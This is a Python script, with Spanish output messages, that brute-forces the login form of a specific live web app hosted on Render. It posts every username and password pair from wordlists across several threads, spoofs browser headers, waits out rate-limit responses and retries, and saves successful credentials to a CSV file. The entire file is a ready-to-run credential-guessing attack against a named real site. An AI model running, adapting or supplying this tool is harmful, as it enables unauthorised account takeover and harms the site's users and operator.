#!/usr/bin/env python3
import argparse, sys, time, random, csv, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import requests

BASE = "https://mi-web-python-fin0.onrender.com"
LOGIN = f"{BASE}/login"

FAIL_MARKERS = ("Credenciales inválidas", "Credenciales invalidas",
                "Credenciales incorrectas", "Usuario o contraseña",
                "incorrect", "inválid")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

lock = threading.Lock(); found = []

def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Referer": LOGIN, "Origin": BASE,
                      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"})
    return s

def is_form(html):
    return 'name="password"' in html or "Panel de Control" in html

def wake_up(timeout=240):
    print("[*] Despertando el servicio...")
    t0 = time.time(); s = new_session()
    while time.time() - t0 < timeout:
        try:
            r = s.get(LOGIN, timeout=15)
            if r.status_code == 200 and "Panel de Control" in r.text:
                print(f"[+] Arriba tras {int(time.time()-t0)}s"); return
        except requests.RequestException:
            pass
        time.sleep(5)
    sys.exit("[-] No despertó.")

def is_success(r):
    """Solo el PATH importa. /login?error=1 sigue siendo fallo."""
    path = urlparse(r.url).path.rstrip("/") or "/"
    if path != "/login":
        return True
    body = r.text
    if any(m in body for m in FAIL_MARKERS):
        return False
    if "Panel de Control" in body:
        return False
    if not is_form(body):
        return True
    return False

def try_login(session, user, pwd, retries=3):
    for attempt in range(retries):
        try:
            r = session.post(LOGIN, data={"username": user, "password": pwd},
                             timeout=25, allow_redirects=True)
            if r.status_code in (502, 503, 504):
                time.sleep(3); continue
            if r.status_code == 429:
                time.sleep(8); continue
            return user, pwd, is_success(r)
        except requests.RequestException:
            time.sleep(2 * (attempt + 1))
    return user, pwd, False

def worker(args, user, pwd):
    u, p, ok = try_login(new_session(), user, pwd)
    with lock:
        if ok:
            found.append((u, p)); print(f"\n[!!!] EXITO -> {u}:{p}\n")
        elif args.verbose:
            print(f"[-] {u}:{p}")
        else:
            print(f"[-] {u}:{p}", end="\r")
    if args.delay:
        time.sleep(random.uniform(0, args.delay))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--user"); ap.add_argument("-U", "--userlist")
    ap.add_argument("-P", "--passlist"); ap.add_argument("-t", "--threads", type=int, default=4)
    ap.add_argument("-d", "--delay", type=float, default=0.3)
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-o", "--out", default="hits.csv")
    args = ap.parse_args()

    if not args.passlist: ap.error("falta -P")
    with open(args.passlist, encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]
    if not passwords: sys.exit("[-] La wordlist está vacía")
    if args.userlist:
        with open(args.userlist, encoding="utf-8", errors="ignore") as f:
            users = [l.strip() for l in f if l.strip()]
    elif args.user: users = [args.user]
    else: ap.error("falta -u o -U")

    wake_up()
    pairs = [(u, p) for u in users for p in passwords]
    print(f"[*] {len(pairs)} combinaciones | {args.threads} hilos\n")

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = [ex.submit(worker, args, u, p) for u, p in pairs]
        for _ in as_completed(futs): pass

    print("\n=== RESULTADOS ===")
    if found:
        with open(args.out, "w", newline="") as f:
            csv.writer(f).writerows(found)
        for u, p in found: print(f"  {u}:{p}")
    else:
        print("  Sin hallazgos.")

if __name__ == "__main__":
    main()
